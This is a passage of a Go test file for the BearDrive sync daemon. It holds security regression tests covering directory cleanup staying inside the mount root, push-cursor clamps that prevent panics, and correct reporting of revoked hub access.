		MTimeNS: time.Now().Add(-time.Hour).UnixNano(),
	}}
	write(t, victim.Folder, "notes/live.md", edited)

	filter, err := loadFilter(victim.Folder, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := victim.materialize(map[string]journal.FileState{}, cache, filter); err != nil {
		t.Fatalf("materialize: %v", err)
	}
	if got, err := os.ReadFile(filepath.Join(victim.Folder, "notes", "live.md")); err != nil || string(got) != edited {
		t.Fatalf("a peer's delete unlinked a file the user had just rewritten (err %v, content %q) — the edit was never journaled and is in no blob", err, string(got))
	}
}

// ---- pruneEmptyDirs: the containment that keeps a cleanup inside the mount ----

// TestSec_PruneEmptyDirs_TheCleanupStopsAtTheMountRoot
//
// pruneEmptyDirs walks UP from a deleted file's directory removing empty ones,
// and the only thing that stops it is the root containment at the top of the
// loop. Reached on every ordinary delete of the last file in a folder, so
// nothing exotic triggers it: without the check the walk carries on past the
// mount root and removes the mount folder itself, then its parent, and keeps
// going for as long as directories happen to be empty — a mount at
// ~/work/project takes ~/work with it.
func TestSec_PruneEmptyDirs_TheCleanupStopsAtTheMountRoot(t *testing.T) {
	base := t.TempDir()
	parent := filepath.Join(base, "work")
	root := filepath.Join(parent, "project")
	deep := filepath.Join(root, "a", "b")
	if err := os.MkdirAll(deep, 0o755); err != nil {
		t.Fatal(err)
	}

	pruneEmptyDirs(root, deep)

	if _, err := os.Stat(root); err != nil {
		t.Errorf("the mount root itself was removed: %v", err)
	}
	if _, err := os.Stat(parent); err != nil {
		t.Errorf("the cleanup walked ABOVE the mount root and removed %s: %v — deleting the last file in a folder took a directory BearDrive was never given", parent, err)
	}
	if _, err := os.Stat(base); err != nil {
		t.Errorf("the cleanup reached %s, two levels above the mount root: %v", base, err)
	}
	// It must still do its job inside the mount.
	if _, err := os.Stat(filepath.Join(root, "a")); err == nil {
		t.Error("control: the empty directories INSIDE the mount were not cleaned up, so the test above proves nothing")
	}
}

// ---- the two push-cursor clamps ----

// TestSec_Cursor_APushCursorAheadOfTheJournalDoesNotPanic
//
// st.PushedOps is a count in sync.json; myOps is what the journal file holds.
// Nothing binds them: sync.json is written by a separate atomic write from the
// journal append, so a crash between the two leaves the cursor ahead — and the
// journal is also the one state file this package rewrites wholesale (pull's
// WriteFileAtomic) and the one whose tail can tear. Both slices, conflictCopies'
// `myOps[pushed:]` and push's `myOps[st.PushedOps:]`, index straight into it.
//
// An out-of-range slice is a panic, and a panic in Cycle is a crashed daemon
// that never comes back on its own: the same sync.json is still there on the
// next start. Each clamp is exercised on its own function, because the two
// cover for each other inside a cycle.
func TestSec_Cursor_APushCursorAheadOfTheJournalDoesNotPanic(t *testing.T) {
	t.Run("conflictCopies", func(t *testing.T) {
		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("conflictCopies panicked with a push cursor ahead of the journal: %v — the daemon dies on every start until sync.json is deleted by hand", r)
			}
		}()
		s := newDevice(t, "victim", nil)
		mine := []journal.Op{secjrnOp(1, "a.md", sha256hex("a"), 1)}
		mine[0].Device = s.Device.ID
		st := store.SyncState{Lamport: 1, PushedOps: 7} // ahead of len(mine)
		if _, err := s.conflictCopies(mine, st.PushedOps, []journal.Op{secjrnOp(1, "a.md", sha256hex("b"), 1)}, &st); err != nil {
			t.Fatalf("conflictCopies: %v", err)
		}
	})

	t.Run("push", func(t *testing.T) {
		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("push panicked with a push cursor ahead of the journal: %v — the daemon dies on every start until sync.json is deleted by hand", r)
			}
		}()
		hub := &secaud5Hub{bodies: map[string][]byte{}}
		s := newDevice(t, "victim", hub)
		mine := []journal.Op{secjrnOp(1, "a.md", sha256hex("a"), 1)}
		mine[0].Device = s.Device.ID
		if _, _, err := s.Store.PutBlobBytes([]byte("a")); err != nil {
			t.Fatal(err)
		}
		mine[0].Blob = sha256hex("a")
		if err := s.Store.AppendOps(s.Device.ID, mine); err != nil {
			t.Fatal(err)
		}
		st := store.SyncState{Lamport: 1, PushedOps: 7} // ahead of len(mine)
		if err := s.push(context.Background(), mine, &st); err != nil {
			t.Fatalf("push: %v", err)
		}
	})
}

// ---- Cycle's ErrForbidden halt ----

// TestSec_Cycle_ARefusedPullPausesSyncInsteadOfLookingOffline
//
// Result documents three answers that "must not be conflated": Offline (retry
// everything), ReadOnly (keep pulling), NoAccess (touch nothing). The halt in
// Cycle is what produces the third one, and it also persists st.Access so
// `bdrive status` — which never runs a cycle — can say so.
//
// Collapse it into Offline and the device reports a healthy connection while it
// has no access at all: `access` is written back as AccessOK at the end of the
// cycle, so the one place a revoked member could learn what happened says
// nothing is wrong, and a transient network blip and a revoked membership
// become the same event in the daemon log.
func TestSec_Cycle_ARefusedPullPausesSyncInsteadOfLookingOffline(t *testing.T) {
	hub := &secaud5Hub{listErr: fmt.Errorf("%w: server: 403 Forbidden", remote.ErrForbidden)}
	victim := newDevice(t, "victim", hub)
	write(t, victim.Folder, "mine.md", "work done while we still had access")

	res, err := victim.Cycle(context.Background())
	if err != nil {
		t.Fatalf("a refused pull must degrade, not fail: %v", err)
	}
	if !res.NoAccess {
		t.Errorf("the hub refused the pull with %v and the cycle reported NoAccess=%v Offline=%v — a revoked membership and a network blip are not the same event",
			hub.listErr, res.NoAccess, res.Offline)
	}
	if !errors.Is(res.AccessErr, remote.ErrForbidden) {
		t.Errorf("AccessErr = %v, want it to wrap remote.ErrForbidden", res.AccessErr)
	}
	st, err := victim.Store.LoadSync()
	if err != nil {
		t.Fatal(err)
	}
	if st.Access != store.AccessNone {
		t.Errorf("persisted access = %q, want %q — `bdrive status` never runs a cycle, so this is the only place a revoked member can learn what happened",
			st.Access, store.AccessNone)
	}
	if len(hub.puts) != 0 {
		t.Errorf("the cycle pushed %d object(s) to a hub that had just refused our pull", len(hub.puts))
	}
}
